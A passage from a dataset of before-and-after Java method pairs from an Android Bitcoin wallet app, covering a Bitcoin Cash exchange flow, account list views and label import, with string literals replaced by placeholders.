  tvSendToAddress.setText(offer.payinAddress);
}"
91068,"private void updateUI(){
  if (isAdded()) {
    fromAmount.setText(getString(R.string.value_currency,offer.currencyFrom,offer.amountFrom));
    toAmount.setText(getString(R.string.value_currency,offer.currencyTo,offer.amountTo));
  }
}","private void updateUI(){
  if (isAdded()) {
    fromAmount.setText(getString(R.string.value_currency,offer.currencyFrom,Constants.decimalFormat.format(offer.amountFrom)));
    toAmount.setText(getString(R.string.value_currency,offer.currencyTo,Constants.decimalFormat.format(offer.amountTo)));
  }
}"
91069,"@Subscribe public void spvSendFundsResult(SpvSendFundsResult event){
  if (!event.operationId.equals(lastOperationId)) {
    return;
  }
  if (!event.isSuccess) {
    new AlertDialog.Builder(getActivity()).setTitle(R.string.error).setMessage(""String_Node_Str"" + event.message).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
      @Override public void onDismiss(      DialogInterface dialogInterface){
        getActivity().finish();
      }
    }
).create().show();
    return;
  }
  final Order order=new Order();
  order.transactionId=event.txHash;
  order.exchangingAmount=String.valueOf(offer.amountFrom);
  order.exchangingCurrency=""String_Node_Str"";
  order.receivingAddress=toAccount.getReceivingAddress().get().toString();
  order.receivingAmount=String.valueOf(offer.amountTo);
  order.receivingCurrency=""String_Node_Str"";
  order.timestamp=SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.LONG,SimpleDateFormat.LONG,Locale.ENGLISH).format(new Date());
  new AlertDialog.Builder(getActivity()).setTitle(R.string.success).setMessage(Html.fromHtml(getString(R.string.exchange_order_placed_dialog,order.timestamp,order.transactionId,order.exchangingAmount,order.receivingAmount))).setPositiveButton(R.string.save_receipt,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialogInterface,    int i){
      String pdf=new BCHExchangeReceiptBuilder().setTransactionId(order.transactionId).setDate(order.timestamp).setReceivingAmount(order.receivingAmount + ""String_Node_Str"" + order.receivingCurrency).setReceivingAddress(order.receivingAddress).setSpendingAmount(order.exchangingAmount + ""String_Node_Str"" + order.exchangingCurrency).setSpendingAccountLabel(mbwManager.getMetadataStorage().getLabelByAccount(fromAccount.getId())).build();
      String filePart=new SimpleDateFormat(""String_Node_Str"",Locale.US).format(new Date());
      File pdfFile=new File(getActivity().getExternalFilesDir(DIRECTORY_DOWNLOADS),""String_Node_Str"" + filePart + ""String_Node_Str"");
      try {
        OutputStream pdfStream=new FileOutputStream(pdfFile);
        pdfStream.write(pdf.getBytes(""String_Node_Str""));
        pdfStream.close();
      }
 catch (      IOException e) {
        Log.e(TAG,""String_Node_Str"",e);
      }
      DownloadManager downloadManager=(DownloadManager)getActivity().getSystemService(DOWNLOAD_SERVICE);
      downloadManager.addCompletedDownload(pdfFile.getName(),pdfFile.getName(),true,""String_Node_Str"",pdfFile.getAbsolutePath(),pdfFile.length(),true);
    }
  }
).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialogInterface){
      getActivity().finish();
    }
  }
).create().show();
  try {
    ExchangeLoggingService.exchangeLoggingService.saveOrder(order).enqueue(new Callback<Void>(){
      @Override public void onResponse(      Call<Void> call,      Response<Void> response){
        Log.d(TAG,""String_Node_Str"");
      }
      @Override public void onFailure(      Call<Void> call,      Throwable t){
        Log.d(TAG,""String_Node_Str"",t);
      }
    }
);
  }
 catch (  RetrofitError e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
}","@Subscribe public void spvSendFundsResult(SpvSendFundsResult event){
  if (!event.operationId.equals(lastOperationId)) {
    return;
  }
  if (!event.isSuccess) {
    new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.error) + ""String_Node_Str"")).setMessage(""String_Node_Str"" + event.message).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
      @Override public void onDismiss(      DialogInterface dialogInterface){
        getActivity().finish();
      }
    }
).create().show();
    return;
  }
  final Order order=new Order();
  order.transactionId=event.txHash;
  order.exchangingAmount=Constants.decimalFormat.format(offer.amountFrom);
  order.exchangingCurrency=CurrencyValue.BCH;
  order.receivingAddress=toAccount.getReceivingAddress().get().toString();
  order.receivingAmount=Constants.decimalFormat.format(offer.amountTo);
  order.receivingCurrency=CurrencyValue.BTC;
  order.timestamp=SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.LONG,SimpleDateFormat.LONG,Locale.ENGLISH).format(new Date());
  new AlertDialog.Builder(getActivity()).setTitle(Html.fromHtml(""String_Node_Str"" + getString(R.string.success) + ""String_Node_Str"")).setMessage(Html.fromHtml(getString(R.string.exchange_order_placed_dialog,order.timestamp,order.transactionId,order.exchangingAmount,order.receivingAmount))).setPositiveButton(R.string.save_receipt,new DialogInterface.OnClickListener(){
    @Override public void onClick(    DialogInterface dialogInterface,    int i){
      String pdf=new BCHExchangeReceiptBuilder().setTransactionId(order.transactionId).setDate(order.timestamp).setReceivingAmount(order.receivingAmount + ""String_Node_Str"" + order.receivingCurrency).setReceivingAddress(order.receivingAddress).setSpendingAmount(order.exchangingAmount + ""String_Node_Str"" + order.exchangingCurrency).setSpendingAccountLabel(mbwManager.getMetadataStorage().getLabelByAccount(fromAccount.getId())).build();
      String filePart=new SimpleDateFormat(""String_Node_Str"",Locale.US).format(new Date());
      File pdfFile=new File(getActivity().getExternalFilesDir(DIRECTORY_DOWNLOADS),""String_Node_Str"" + filePart + ""String_Node_Str"");
      try {
        OutputStream pdfStream=new FileOutputStream(pdfFile);
        pdfStream.write(pdf.getBytes(""String_Node_Str""));
        pdfStream.close();
      }
 catch (      IOException e) {
        Log.e(TAG,""String_Node_Str"",e);
      }
      DownloadManager downloadManager=(DownloadManager)getActivity().getSystemService(DOWNLOAD_SERVICE);
      downloadManager.addCompletedDownload(pdfFile.getName(),pdfFile.getName(),true,""String_Node_Str"",pdfFile.getAbsolutePath(),pdfFile.length(),true);
    }
  }
).setNegativeButton(R.string.close,null).setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialogInterface){
      getActivity().finish();
    }
  }
).create().show();
  try {
    ExchangeLoggingService.exchangeLoggingService.saveOrder(order).enqueue(new Callback<Void>(){
      @Override public void onResponse(      Call<Void> call,      Response<Void> response){
        Log.d(TAG,""String_Node_Str"");
      }
      @Override public void onFailure(      Call<Void> call,      Throwable t){
        Log.d(TAG,""String_Node_Str"",t);
      }
    }
);
  }
 catch (  RetrofitError e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
}"
91070,"@Override protected void onHandleIntent(@Nullable Intent intent){
  Log.i(LOG_TAG,""String_Node_Str"");
  if (intent != null && intent.getAction() != null) {
    String from, to, destAddress;
    double amount;
switch (intent.getAction()) {
case ACTION_GET_CURRENCIES:
      if (currencies == null) {
        loadCurrencies();
      }
    if (currencies == null || currencies.size() == 0) {
      Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
      LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
      break;
    }
  Intent currenciesIntent=new Intent(ChangellyService.INFO_CURRENCIES,null,this,ChangellyService.class);
currenciesIntent.putExtra(CURRENCIES,currencies.toArray());
currenciesIntent.putStringArrayListExtra(CURRENCIES,new ArrayList<>(currencies));
LocalBroadcastManager.getInstance(this).sendBroadcast(currenciesIntent);
break;
case ACTION_GET_MIN_EXCHANGE:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
double min=getMinAmount(from,to);
if (min == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent minAmountIntent=new Intent(ChangellyService.INFO_MIN_AMOUNT,null,this,ChangellyService.class);
minAmountIntent.putExtra(FROM,from);
minAmountIntent.putExtra(TO,to);
minAmountIntent.putExtra(AMOUNT,min);
LocalBroadcastManager.getInstance(this).sendBroadcast(minAmountIntent);
break;
case ACTION_GET_EXCHANGE_AMOUNT:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
double offer=getExchangeAmount(from,to,amount);
if (offer == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent exchangeAmountIntent=new Intent(ChangellyService.INFO_EXCH_AMOUNT,null,this,ChangellyService.class);
exchangeAmountIntent.putExtra(FROM,from);
exchangeAmountIntent.putExtra(TO,to);
exchangeAmountIntent.putExtra(FROM_AMOUNT,amount);
exchangeAmountIntent.putExtra(AMOUNT,offer);
LocalBroadcastManager.getInstance(this).sendBroadcast(exchangeAmountIntent);
break;
case ACTION_CREATE_TRANSACTION:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
destAddress=intent.getStringExtra(DESTADDRESS);
ChangellyTransactionOffer res=createTransaction(from,to,amount,destAddress);
Intent transactionIntent;
if (res == null) {
transactionIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
}
 else {
transactionIntent=new Intent(ChangellyService.INFO_TRANSACTION,null,this,ChangellyService.class);
res.amountFrom=amount;
transactionIntent.putExtra(OFFER,res);
}
LocalBroadcastManager.getInstance(this).sendBroadcast(transactionIntent);
break;
}
}
}","@Override protected void onHandleIntent(@Nullable Intent intent){
  Log.i(LOG_TAG,""String_Node_Str"");
  if (intent != null && intent.getAction() != null) {
    String from, to, destAddress;
    double amount;
switch (intent.getAction()) {
case ACTION_GET_CURRENCIES:
      if (currencies == null) {
        loadCurrencies();
      }
    if (currencies == null || currencies.size() == 0) {
      Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
      LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
      break;
    }
  Intent currenciesIntent=new Intent(ChangellyService.INFO_CURRENCIES,null,this,ChangellyService.class);
currenciesIntent.putExtra(CURRENCIES,currencies.toArray());
currenciesIntent.putStringArrayListExtra(CURRENCIES,new ArrayList<>(currencies));
LocalBroadcastManager.getInstance(this).sendBroadcast(currenciesIntent);
break;
case ACTION_GET_MIN_EXCHANGE:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
double min=getMinAmount(from,to);
if (min == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent minAmountIntent=new Intent(ChangellyService.INFO_MIN_AMOUNT,null,this,ChangellyService.class);
minAmountIntent.putExtra(FROM,from);
minAmountIntent.putExtra(TO,to);
minAmountIntent.putExtra(AMOUNT,min);
LocalBroadcastManager.getInstance(this).sendBroadcast(minAmountIntent);
break;
case ACTION_GET_EXCHANGE_AMOUNT:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
double offer=getExchangeAmount(from,to,amount);
if (offer == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent exchangeAmountIntent=new Intent(ChangellyService.INFO_EXCH_AMOUNT,null,this,ChangellyService.class);
exchangeAmountIntent.putExtra(FROM,from);
exchangeAmountIntent.putExtra(TO,to);
exchangeAmountIntent.putExtra(FROM_AMOUNT,amount);
exchangeAmountIntent.putExtra(AMOUNT,offer);
LocalBroadcastManager.getInstance(this).sendBroadcast(exchangeAmountIntent);
break;
case ACTION_CREATE_TRANSACTION:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
destAddress=intent.getStringExtra(DESTADDRESS);
ChangellyTransactionOffer res=createTransaction(from,to,amount,destAddress);
double toAmount=getExchangeAmount(from,to,amount);
Intent transactionIntent;
if (res == null || toAmount == -1) {
transactionIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
}
 else {
transactionIntent=new Intent(ChangellyService.INFO_TRANSACTION,null,this,ChangellyService.class);
res.amountFrom=amount;
res.amountTo=toAmount;
transactionIntent.putExtra(OFFER,res);
}
LocalBroadcastManager.getInstance(this).sendBroadcast(transactionIntent);
break;
}
}
}"
91071,"@Override public void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setRetainInstance(true);
  UUID toAddress=(UUID)getArguments().getSerializable(Constants.DESTADDRESS);
  UUID fromAddress=(UUID)getArguments().getSerializable(Constants.FROM_ADDRESS);
  amount=getArguments().getDouble(Constants.FROM_AMOUNT);
  mbwManager=MbwManager.getInstance(getActivity());
  mbwManager.getEventBus().register(this);
  fromAccount=mbwManager.getWalletManager(false).getAccount(fromAddress);
  toAccount=mbwManager.getWalletManager(false).getAccount(toAddress);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(getActivity()).registerReceiver(receiver,intentFilter);
  }
  createOffer();
}","@Override public void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setRetainInstance(true);
  UUID toAddress=(UUID)getArguments().getSerializable(Constants.DESTADDRESS);
  UUID fromAddress=(UUID)getArguments().getSerializable(Constants.FROM_ADDRESS);
  amount=getArguments().getDouble(Constants.FROM_AMOUNT);
  mbwManager=MbwManager.getInstance(getActivity());
  mbwManager.getEventBus().register(this);
  fromAccount=mbwManager.getWalletManager(false).getAccount(fromAddress);
  toAccount=mbwManager.getWalletManager(false).getAccount(toAddress);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(getActivity()).registerReceiver(receiver,intentFilter);
  }
  offerCaller=new Handler();
}"
91072,"@Override public void run(){
  buttonContinue.setEnabled(false);
  long fromValue=ExactBitcoinCashValue.from(BigDecimal.valueOf(offer.amountFrom)).getLongValue();
  lastOperationId=UUID.randomUUID().toString();
  WalletAccount account=mbwManager.getSelectedAccount();
switch (account.getType()) {
case BCHBIP44:
{
      Bip44BCHAccount bip44BCHAccount=(Bip44BCHAccount)account;
      Intent serviceIntent=IntentContract.SendFunds.createIntent(lastOperationId,bip44BCHAccount.getAccountIndex(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
      WalletApplication.sendToSpv(serviceIntent,WalletAccount.Type.BCHBIP44);
      break;
    }
case BCHSINGLEADDRESS:
{
    SingleAddressBCHAccount bip44BCHAccount=(SingleAddressBCHAccount)account;
    Intent service=IntentContract.SendFundsSingleAddress.createIntent(lastOperationId,bip44BCHAccount.getId().toString(),offer.payinAddress,fromValue,TransactionFee.NORMAL,1.0f);
    WalletApplication.sendToSpv(service,WalletAccount.Type.BCHSINGLEADDRESS);
    break;
  }
}
}","@Override public void run(){
  createOffer();
  offerCaller.postDelayed(this,TimeUnit.MINUTES.toMillis(1));
}"
91073,"public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  for (  WalletAccount walletAccount : walletManager.getActiveAccounts()) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}","public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}"
91074,"public static boolean showLegacyAccountWarning(WalletAccount account,MbwManager mbwManager){
  if (account.isArchived()) {
    return false;
  }
  Balance balance=account.getBalance();
  return account instanceof SingleAddressAccount && balance.getReceivingBalance() + balance.getSpendableBalance() > 0 && account.canSpend() && !mbwManager.getMetadataStorage().getIgnoreLegacyWarning(account.getId());
}","public static boolean showLegacyAccountWarning(WalletAccount account,MbwManager mbwManager){
  if (account.isArchived()) {
    return false;
  }
  Balance balance=account.getBalance();
  return account.getType() == WalletAccount.Type.BTCSINGLEADDRESS && balance.getReceivingBalance() + balance.getSpendableBalance() > 0 && account.canSpend() && !mbwManager.getMetadataStorage().getIgnoreLegacyWarning(account.getId());
}"
91075,"public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=((TextView)rowView.findViewById(R.id.tvAddress));
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=((TextView)rowView.findViewById(R.id.tvBalance));
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}","public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=rowView.findViewById(R.id.tvAddress);
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  TextView tvAccountType=rowView.findViewById(R.id.tvAccountType);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=rowView.findViewById(R.id.tvBalance);
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showLegacyAccountWarning=showLegacyAccountWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(showLegacyAccountWarning ? View.VISIBLE : View.GONE);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
    tvAccountType.setVisibility(View.GONE);
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
    if (walletAccount.getType() == WalletAccount.Type.BCHBIP44 || walletAccount.getType() == WalletAccount.Type.BCHSINGLEADDRESS) {
      tvAccountType.setText(Html.fromHtml(tvAccountType.getResources().getString(R.string.bitcoin_cash)));
      tvAccountType.setVisibility(View.VISIBLE);
    }
 else {
      tvAccountType.setVisibility(View.GONE);
    }
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}"
91076,"@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  RecyclerView.ViewHolder result=null;
  if (viewType == GROUP_TITLE_TYPE || viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_title_view,parent,false);
    GroupTitleViewHolder res=new GroupTitleViewHolder(view);
    res.tvBalance.setEventBus(mbwManager.getEventBus());
    res.tvBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    result=res;
  }
 else   if (viewType == ACCOUNT_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row,parent,false);
    result=new AccountViewHolder(view);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row_total,parent,false);
    TotalViewHolder res=new TotalViewHolder(view);
    res.tcdBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    res.tcdBalance.setEventBus(mbwManager.getEventBus());
    result=res;
  }
  return result;
}","@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  RecyclerView.ViewHolder result=null;
  if (viewType == GROUP_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_title_view,parent,false);
    GroupTitleViewHolder res=new GroupTitleViewHolder(view);
    res.tvBalance.setEventBus(mbwManager.getEventBus());
    res.tvBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    result=res;
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_archived_title_view,parent,false);
    result=new ArchivedGroupTitleViewHolder(view);
  }
 else   if (viewType == ACCOUNT_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row,parent,false);
    result=new AccountViewHolder(view);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row_total,parent,false);
    TotalViewHolder res=new TotalViewHolder(view);
    res.tcdBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    res.tcdBalance.setEventBus(mbwManager.getEventBus());
    result=res;
  }
  return result;
}"
91077,"@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
